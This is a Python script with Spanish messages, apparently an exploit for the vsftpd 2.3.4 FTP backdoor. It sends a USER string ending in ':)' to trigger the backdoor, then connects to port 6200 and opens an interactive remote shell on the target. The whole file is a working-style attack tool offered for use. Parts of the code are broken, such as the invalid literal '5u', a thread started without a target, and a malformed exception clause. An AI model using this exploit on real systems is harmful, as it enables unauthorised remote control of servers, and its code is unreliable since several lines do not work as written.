import socket
import sys
import threading
import os
import psutil
def reiniciar_script():
    try:
        p = psutil.Process(os.getpid())
        for proceso in p.get_open_files() + p.connections():
            os.close(proceso.fd)
    except Exception:
        pass
    python = sys.executable
    os.execl(python, python, *sys.argv)
def path(backdoor):
    comando = ('pwd' + '\n')
    backdoor.send(comando.encode())
    path = (backdoor.recv(1024).decode('utf-8')).rstrip('\n')
    return path
def conexion(host, puerto):
    try:
        pwned = (b':)') #: = 0x3a, 0x29 = )
        str(pwned)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[+] Intentando Conectar [+]")
        s.connect((host, puerto))
        s.send(b'USER backdored%s\n' % pwned)
        s.send(b'PASS porfavor\n')
        s.close()
        print('[+] Backdoor inyectado')
    except ConnectionError:
        print ("Algo Salio mal asegurate de que esta el servidor ftp en el puerto indicado")
def shell(host):
        backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor.connect((host, 6200))
        print("Exploit by \x6c\x75\x69\x6a\x61\x69\x74")
        print('[+] Shell establecida en {}:6200'.format(host))
        shellThread = threading.Thread(args=(backdoor))
        shellThread.start()
        
        while True:
                timeout = 5u
                comando = input("luijaitshell| [{}] > ".format(path(backdoor)))
                #Terminamos el programa si el comando es = exit
                if comando == "exit":
                    print ("Terminando shell...")
                    sys.exit(0)
                comando = (comando +  '\n')
                backdoor.send(comando.encode())
                
                if comando.startswith("cd"):
                    timeout = 0.1
                    
        
                backdoor.settimeout(timeout)
                try:
                    print (backdoor.recv(1024).decode('utf-8'))
                except socket.timeout:
                    pass
                except Exception:
                    return
if __name__ == "__main__":
    try:
        host = sys.argv[1]
        puerto = sys.argv[2]
        conexion(host, int(puerto))
        shell(host)
    except IndexError:
        print ("Uso: python {} <ip> <puerto>".format(sys.argv[0]))
        sys.exit()
   # except ConnectionError:
     #   print ("Ha habido un error conectando con el servidor FTP asegurate de que tienes conectividad con el servicio")
    except ConnectionError or ConnectionRefusedError:
        print ("Intentando conectar otra vez...")
        reiniciar_script()
        #1.45
    except KeyboardInterrupt:
        print("\nTerminando...")
        #except NameError:
         #   print("Uso: python {} <ip> <puerto>".format(sys.argv[0]))
      
